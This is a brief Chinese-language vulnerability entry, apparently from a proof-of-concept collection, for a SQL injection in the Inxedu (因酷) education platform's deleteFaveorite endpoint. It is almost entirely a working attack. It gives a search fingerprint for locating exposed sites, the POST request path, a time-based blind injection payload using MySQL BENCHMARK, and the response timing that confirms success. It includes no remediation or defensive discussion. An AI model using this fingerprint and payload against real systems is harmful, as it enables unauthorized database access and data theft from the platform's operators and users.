# 因酷教育平台deleteFaveorite存在SQL注入漏洞

因酷教育平台 ｜ SQL注入 ｜ —
- **指纹**：`body="/image/keupload?"`
- **请求**：`POST /webapp/deleteFaveorite HTTP/1.1`

**Payload**
```
id=1002) AND 3898=BENCHMARK(5000000,MD5(0x54775358))-- lJHk
```
- **响应特征**：200 响应时间>=5s